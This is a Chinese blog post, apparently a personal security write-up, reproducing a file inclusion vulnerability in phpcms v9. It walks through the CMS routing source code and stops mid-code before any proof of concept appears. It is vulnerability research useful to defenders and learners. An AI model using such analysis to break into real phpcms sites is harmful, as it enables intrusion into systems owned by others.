<!DOCTYPE html>
<html lang=>
  <head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="description" content="">
  <meta name="keywords" content="root">
  
    <link rel="icon" href="/favicon.ico">
  
    
  <title>phpcmsv9文件包含漏洞[复现] | The clown is laughing at you</title>
  <link rel="stylesheet" href="/style.css">
  <link rel="stylesheet" href="/lib/jquery.fancybox.min.css">
  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
</head>

<body>
  <header>
  <div class="header-container">
    <a class="logo" href="/">
      <span>The clown is laughing at you</span>
    </a>
    <ul class="right-header">
      
        <li class="nav-item">
          
            <a href="/" class="item-link">首页</a>
          
        </li>
      
        <li class="nav-item">
          
            <a href="/about" class="item-link">关于</a>
          
        </li>
      
        <li class="nav-item">
          
            <a href="/archives" class="item-link">归档</a>
          
        </li>
      
        <li class="nav-item">
          
            <a href="/tags" class="item-link">标签</a>
          
        </li>
      
    </ul>
  </div>
</header>

  <main id="post">
  <div class="content">
    <article>
        <section class="content markdown-body">
          <h1>phpcmsv9文件包含漏洞[复现]</h1>
          <div class="post-meta">
            <i class="fa fa-calendar" aria-hidden="true"></i> <time>2019/07/16</time>
            
            
          </div>
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>php 5.6<br>mysql 5.0<br>ubuntu 19<br>phpcmsv9(我下载的版本UTF8)</p>
<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>又是一整感觉，自己菜的明明白白，对函数的理解不够使深刻，然后分析函数的能力太差了，我自己都看不下去了。然后感谢<a href="https://www.freebuf.com/author/wnltc0" target="_blank" rel="noopener">wnltc0师傅</a>,十分耐心地和我讲解我不懂的点。然后这次花了挺长时间的，然后因为最后的POC靠自己整的，就成功了一半，因为，我下载的源码里有缺失，或者是我太笨了，看懵了，然后我就寻找另外一个触发点，结果失败了…….之后再琢磨一下。<br><img src="/2019/07/16/phpcmsv9文件包含漏洞-复现/1.png" alt=""></p>
<h1 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h1><p>代码本身存在bug，并且未对用户输入的内容进行过滤，使得用户可以上传恶意php文件，用户可以通过文件包含漏洞读取该恶意文件。</p>
<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><p>这次分析，分两部分完成，第一个是分析整个cms的路由，第二分析漏洞触发点</p>
<h2 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h2><p>定位：index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  index.php PHPCMS 入口</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@copyright</span>			(C) 2005-2010 PHPCMS</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@license</span>				http://www.phpcms.cn/license/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@lastmodify</span>			2010-6-1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">//PHPCMS根目录</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">'PHPCMS_PATH'</span>, dirname(<span class="keyword">__FILE__</span>).DIRECTORY_SEPARATOR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> PHPCMS_PATH.<span class="string">'/phpcms/base.php'</span>;</span><br><span class="line"></span><br><span class="line">pc_base::creat_app();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>这里include base.php，定位：/phpcms/base.php</p>
<p>然后跟进一下creat_app()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">creat_app</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">self</span>::load_sys_class(<span class="string">'application'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>调用<strong>load_sys_class()</strong>函数，跟进这个函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load_sys_class</span><span class="params">($classname, $path = <span class="string">''</span>, $initialize = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">self</span>::_load_class($classname, $path, $initialize);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>然后这里有另外几个和load_sys_clas()作用位于同一层面的函数，逐个介绍一下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定位：/phpcms/base.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//_load_sys_class()</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 加载系统类方法</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $classname 类名</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $path 扩展地址</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> intger $initialize 是否初始化</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load_sys_class</span><span class="params">($classname, $path = <span class="string">''</span>, $initialize = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">self</span>::_load_class($classname, $path, $initialize);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//_load_app_class()	</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 加载应用类方法</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $classname 类名</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $m 模块</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> intger $initialize 是否初始化</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load_app_class</span><span class="params">($classname, $m = <span class="string">''</span>, $initialize = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">		$m = <span class="keyword">empty</span>($m) &amp;&amp; defined(<span class="string">'ROUTE_M'</span>) ? ROUTE_M : $m;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>($m)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">self</span>::_load_class($classname, <span class="string">'modules'</span>.DIRECTORY_SEPARATOR.$m.DIRECTORY_SEPARATOR.<span class="string">'classes'</span>, $initialize);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//load_model()</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 加载数据模型</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@param</span> string $classname 类名</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load_model</span><span class="params">($classname)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">self</span>::_load_class($classname,<span class="string">'model'</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//load_config()</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 加载配置文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $file 配置文件</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $key  要获取的配置荐</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $default  默认配置。当获取配置项目失败时该值发生作用。</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> boolean $reload 强制重新加载。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">load_config</span><span class="params">($file, $key = <span class="string">''</span>, $default = <span class="string">''</span>, $reload = false)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span> $configs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">if</span> (!$reload &amp;&amp; <span class="keyword">isset</span>($configs[$file])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>($key)) &#123;</span><br><span class="line">                <span class="keyword">return</span> $configs[$file];</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($configs[$file][$key])) &#123;</span><br><span class="line">                <span class="keyword">return</span> $configs[$file][$key];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> $default;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        $path = CACHE_PATH.<span class="string">'configs'</span>.DIRECTORY_SEPARATOR.$file.<span class="string">'.php'</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists($path)) &#123;</span><br><span class="line">            $configs[$file] = <span class="keyword">include</span> $path;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($key)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $configs[$file];</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="keyword">isset</span>($configs[$file][$key])) &#123;</span><br><span class="line">            <span class="keyword">return</span> $configs[$file][$key];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> $default;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>load_config()</strong>函数调用了之后，会调用/caches/config/$file.php<br>而另外三个函数都会调用<code>**_load_class()**</code>方法，三个的差别在于参数有所不同。</p>
<p>跟进_load_class()<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">_load_class</span><span class="params">($classname, $path = <span class="string">''</span>, $initialize = <span class="number">1</span>)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">static</span> $classes = <span class="keyword">array</span>();</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">empty</span>($path)) $path = <span class="string">'libs'</span>.DIRECTORY_SEPARATOR.<span class="string">'classes'</span>;</span><br><span class="line"></span><br><span class="line">	$key = md5($path.$classname);</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($classes[$key])) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">empty</span>($classes[$key])) &#123;</span><br><span class="line">			<span class="keyword">return</span> $classes[$key];</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (file_exists(PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.<span class="string">'.class.php'</span>)) &#123;</span><br><span class="line">		<span class="keyword">include</span> PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.<span class="string">'.class.php'</span>;</span><br><span class="line">		$name = $classname;</span><br><span class="line">		<span class="keyword">if</span> ($my_path = <span class="keyword">self</span>::my_path(PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.<span class="string">'.class.php'</span>)) &#123;</span><br><span class="line">			<span class="keyword">include</span> $my_path;</span><br><span class="line">			$name = <span class="string">'MY_'</span>.$classname;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> ($initialize) &#123;</span><br><span class="line">			$classes[$key] = <span class="keyword">new</span> $name;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$classes[$key] = <span class="keyword">true</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $classes[$key];</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>当调用load_sys_class时，<strong>到 phpcms/libs/classes目录下找xx.class.php</strong></p>
<p>当调用load_app_class时，<strong>到phpcms/modules/模块名/classes/目录下找xx.class.php</strong></p>
<p>当调用load_model时，<strong>到phpcms/model目录下找xx.class.php</strong></p>
<p>如果$initialize=1时，包含类文件并实例化类，反之，仅包含类文件</p>
<p>然后我们回到creat_app()函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">creat_app</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">self</span>::load_sys_class(<span class="string">'application'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>加载了php/libs/classes/application.class.php,实例化application类<br>跟进php/libs/classes/application.class.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$param = pc_base::load_sys_class(<span class="string">'param'</span>);</span><br><span class="line">		define(<span class="string">'ROUTE_M'</span>, $param-&gt;route_m());<span class="comment">//模块</span></span><br><span class="line">		define(<span class="string">'ROUTE_C'</span>, $param-&gt;route_c());<span class="comment">//控制器</span></span><br><span class="line">		define(<span class="string">'ROUTE_A'</span>, $param-&gt;route_a());<span class="comment">//事件</span></span><br><span class="line">		<span class="keyword">$this</span>-&gt;init();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
<p>先看到_construct()方法，这里实例化param类，跟进php/libs/classes/param.class.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  param.class.php	参数处理类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@copyright</span>			(C) 2005-2012 PHPCMS</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@license</span>				http://www.phpcms.cn/license/</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@lastmodify</span>			2012-9-17</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">param</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//路由配置</span></span><br><span class="line">	<span class="keyword">private</span> $route_config = <span class="string">''</span>;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!get_magic_quotes_gpc()) &#123;</span><br><span class="line">            $_POST = new_addslashes($_POST);</span><br><span class="line">            $_GET = new_addslashes($_GET);</span><br><span class="line">            $_REQUEST = new_addslashes($_REQUEST);</span><br><span class="line">            $_COOKIE = new_addslashes($_COOKIE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;route_config = pc_base::load_config(<span class="string">'route'</span>, SITE_URL) ? pc_base::load_config(<span class="string">'route'</span>, SITE_URL) : pc_base::load_config(<span class="string">'route'</span>, <span class="string">'default'</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;route_config[<span class="string">'data'</span>][<span class="string">'POST'</span>]) &amp;&amp; is_array(<span class="keyword">$this</span>-&gt;route_config[<span class="string">'data'</span>][<span class="string">'POST'</span>])) &#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;route_config[<span class="string">'data'</span>][<span class="string">'POST'</span>] <span class="keyword">as</span> $_key =&gt; $_value) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[$_key])) $_POST[$_key] = $_value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">	... ...</span><br><span class="line">	... ...</span><br><span class="line">	 </span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 获取模型</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">route_m</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$m = <span class="keyword">isset</span>($_GET[<span class="string">'m'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'m'</span>]) ? $_GET[<span class="string">'m'</span>] : (<span class="keyword">isset</span>($_POST[<span class="string">'m'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'m'</span>]) ? $_POST[<span class="string">'m'</span>] : <span class="string">''</span>);</span><br><span class="line">		$m = <span class="keyword">$this</span>-&gt;safe_deal($m);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>($m)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;route_config[<span class="string">'m'</span>];</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>(is_string($m)) <span class="keyword">return</span> $m;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 获取控制器</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">route_c</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$c = <span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'c'</span>]) ? $_GET[<span class="string">'c'</span>] : (<span class="keyword">isset</span>($_POST[<span class="string">'c'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'c'</span>]) ? $_POST[<span class="string">'c'</span>] : <span class="string">''</span>);</span><br><span class="line">		$c = <span class="keyword">$this</span>-&gt;safe_deal($c);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>($c)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;route_config[<span class="string">'c'</span>];</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>(is_string($c)) <span class="keyword">return</span> $c;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 获取事件</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">route_a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$a = <span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_GET[<span class="string">'a'</span>]) ? $_GET[<span class="string">'a'</span>] : (<span class="keyword">isset</span>($_POST[<span class="string">'a'</span>]) &amp;&amp; !<span class="keyword">empty</span>($_POST[<span class="string">'a'</span>]) ? $_POST[<span class="string">'a'</span>] : <span class="string">''</span>);</span><br><span class="line">		$a = <span class="keyword">$this</span>-&gt;safe_deal($a);</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">empty</span>($a)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;route_config[<span class="string">'a'</span>];</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">if</span>(is_string($a)) <span class="keyword">return</span> $a;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	... ...</span><br><span class="line">	... ...</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>其中的route_config<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;route_config = pc_base::load_config(<span class="string">'route'</span>, SITE_URL) ? pc_base::load_config(<span class="string">'route'</span>, SITE_URL) : pc_base::load_config(<span class="string">'route'</span>, <span class="string">'default'</span>);</span><br></pre></td></tr></table></figure></p>
<p>可以跟进caches/configs/route.php,查看<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'default'</span>=&gt;<span class="keyword">array</span>(<span class="string">'m'</span>=&gt;<span class="string">'content'</span>, <span class="string">'c'</span>=&gt;<span class="string">'index'</span>, <span class="string">'a'</span>=&gt;<span class="string">'init'</span>),</span><br><span class="line">);</span><br></pre></td></tr></table></figure></p>
<p>这个类中，我们可以看到用户可以通过需求选择模块，控制器，以及需要加载的事件.<br>这个之后，分别给定’ROUTE_M’,’ROUTE_C’,’ROUTE_A’的值，然后进入init()函数，<br>跟进init():<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 调用事件</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      $controller = <span class="keyword">$this</span>-&gt;load_controller();</span><br><span class="line">      <span class="keyword">if</span> (method_exists($controller, ROUTE_A)) &#123;</span><br><span class="line">          <span class="keyword">if</span> (preg_match(<span class="string">'/^[_]/i'</span>, ROUTE_A)) &#123;</span><br><span class="line">              <span class="keyword">exit</span>(<span class="string">'You are visiting the action is to protect the private action'</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              call_user_func(<span class="keyword">array</span>($controller, ROUTE_A));</span><br><span class="line">          &#125;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">exit</span>(<span class="string">'Action does not exist.'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
<p>关注<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call_user_func(<span class="keyword">array</span>($controller, ROUTE_A));</span><br></pre></td></tr></table></figure></p>
<p>然后跟进load_controller()…..<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 加载控制器</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> string $filename</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> string $m</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> obj</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">load_controller</span><span class="params">($filename = <span class="string">''</span>, $m = <span class="string">''</span>)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>($filename)) $filename = ROUTE_C;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>($m)) $m = ROUTE_M;</span><br><span class="line">      $filepath = PC_PATH.<span class="string">'modules'</span>.DIRECTORY_SEPARATOR.$m.DIRECTORY_SEPARATOR.$filename.<span class="string">'.php'</span>;</span><br><span class="line">      <span class="keyword">if</span> 